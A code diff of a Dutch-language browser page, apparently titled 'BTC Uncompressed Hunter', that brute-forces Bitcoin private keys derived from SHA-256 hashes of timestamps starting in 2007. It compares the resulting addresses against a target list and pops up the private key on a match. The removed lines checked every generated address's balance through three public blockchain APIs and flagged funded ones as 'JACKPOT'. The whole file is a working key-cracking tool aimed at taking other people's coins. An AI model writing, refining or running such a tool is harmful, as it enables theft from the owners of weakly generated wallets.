@@ -2,7 +2,7 @@
 <html lang="nl">
 <head>
     <meta charset="UTF-8">
-    <title>BTC Pro Hunter: Multi-API</title>
+    <title>BTC Uncompressed Hunter</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         input { background: #111; color: #0f0; border: 1px solid #333; padding: 5px; width: 150px; }
@@ -13,20 +13,21 @@
     </style>
 </head>
 <body>
-    <h2>BTC Pro Hunter (Multi-API Failover)</h2>
-    Zoekwoord (WIF): <input type="text" id="zoek" value="5">
+    <h2>BTC Uncompressed Hunter</h2>
     Start Timestamp: <input type="number" id="startTs" value="1167782400000">
     <button id="startBtn" onclick="start()">START SCAN</button>
     <button id="stopBtn" onclick="stop()" disabled>STOP SCAN</button>
     <div id="stat">Status: Gereed</div>
     <table>
-        <thead><tr><th>Status</th><th>WIF</th><th>Adres</th><th>Saldo</th></tr></thead>
+        <thead><tr><th>Status</th><th>WIF</th><th>Adres</th></tr></thead>
         <tbody id="tabel"></tbody>
     </table>
 
 <script id="workerScript" type="javascript/worker">
     importScripts('https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js',
                   'https://cdnjs.cloudflare.com/ajax/libs/elliptic/6.5.4/elliptic.min.js');
+
+    const TARGET_ADDRESSES = new Set(["1JArS6..."]); 
 
     const ec = new elliptic.ec("secp256k1");
     const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
@@ -43,7 +44,7 @@
     }
 
     self.onmessage = async (e) => {
-        let { startTs, zoek } = e.data;
+        let { startTs } = e.data;
         let ts = startTs;
         while(true) {
             let hash = CryptoJS.SHA256(ts.toString()).toString();
@@ -53,41 +54,28 @@
             let h2 = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(h1)).toString();
             let wif = toB58(wifHex + h2.substring(0, 8));
 
-            if(wif.includes(zoek)) {
-                let pub = ec.keyFromPrivate(priv, 'hex').getPublic(false, 'hex');
-                let sha = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(pub)).toString();
-                let rip = CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(sha)).toString();
-                let addrHex = "00" + rip;
-                let ah1 = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(addrHex)).toString();
-                let ah2 = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(ah1)).toString();
-                let address = toB58(addrHex + ah2.substring(0, 8));
+            let pub = ec.keyFromPrivate(priv, 'hex').getPublic(false, 'hex');
+            let sha = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(pub)).toString();
+            let rip = CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(sha)).toString();
+            let addrHex = "00" + rip;
+            let ah1 = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(addrHex)).toString();
+            let ah2 = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(ah1)).toString();
+            let address = toB58(addrHex + ah2.substring(0, 8));
+
+            if(TARGET_ADDRESSES.has(address)) {
                 self.postMessage({ type: 'MATCH', wif, address });
+                break;
             }
+
             ts += 4;
-            if(ts % 500 === 0) self.postMessage({ type: 'STATUS', ts });
+            // Update status met huidige TS getal
+            if(ts % 500 === 0) self.postMessage({ type: 'STATUS', ts, wif, addr: address });
         }
     };
 </script>
 
 <script>
     let workers = [];
-
-    async function checkBalance(addr) {
-        // Lijst van API's om te proberen (Failover)
-        const apis = [
-            async (a) => (await fetch(`https://api.blockchair.com/bitcoin/dashboards/address/${a}`)).json().then(d => d.data[a].address.balance / 100000000),
-            async (a) => (await fetch(`https://blockchain.info/q/addressbalance/${a}`)).json().then(b => b / 100000000),
-            async (a) => (await fetch(`https://sochain.com/api/v2/get_address_balance/BTC/${a}`)).json().then(d => parseFloat(d.data.confirmed_balance))
-        ];
-
-        for (let api of apis) {
-            try {
-                let bal = await api(addr);
-                return bal + " BTC";
-            } catch(e) { continue; } // Probeer volgende API bij error
-        }
-        return "ERROR";
-    }
 
     function stop() {
         workers.forEach(w => w.terminate());
@@ -105,20 +93,21 @@
         
         for(let i=0; i<4; i++) {
             let w = new Worker(URL.createObjectURL(blob));
-            w.postMessage({ startTs: startVal + i, zoek: document.getElementById('zoek').value });
-            w.onmessage = async (e) => {
+            w.postMessage({ startTs: startVal + (i * 1000) });
+            w.onmessage = (e) => {
+                let tabel = document.getElementById('tabel');
                 if(e.data.type === 'STATUS') {
+                    // Update status met het TS nummer zoals in je originele script
                     document.getElementById('stat').innerText = "Scannen: " + e.data.ts;
-                } else {
-                    let tabel = document.getElementById('tabel');
-                    if (tabel.rows.length >= 200) tabel.deleteRow(tabel.rows.length - 1);
-                    let row = tabel.insertRow(0);
-                    row.innerHTML = `<td>Checking...</td><td>${e.data.wif}</td><td>${e.data.address}</td><td>...</td>`;
                     
-                    let bal = await checkBalance(e.data.address);
-                    row.cells[0].innerText = (bal !== "ERROR" && parseFloat(bal) > 0) ? "JACKPOT!" : (bal === "ERROR" ? "FOUT" : "GECONTROLEERD");
-                    row.cells[3].innerText = bal;
-                    if(bal !== "ERROR" && parseFloat(bal) > 0) { alert("SALDO GEVONDEN: " + bal); stop(); }
+                    if (tabel.rows.length > 15) tabel.deleteRow(tabel.rows.length - 1);
+                    let row = tabel.insertRow(0);
+                    row.innerHTML = `<td>Checking</td><td>${e.data.wif}</td><td>${e.data.addr}</td>`;
+                } else if(e.data.type === 'MATCH') {
+                    let row = tabel.insertRow(0);
+                    row.innerHTML = `<td style="color:yellow; font-weight:bold">MATCH!</td><td>${e.data.wif}</td><td>${e.data.address}</td>`;
+                    alert("MATCH GEVONDEN!\nAdres: " + e.data.address + "\nWIF: " + e.data.wif);
+                    stop();
                 }
             };
             workers.push(w);
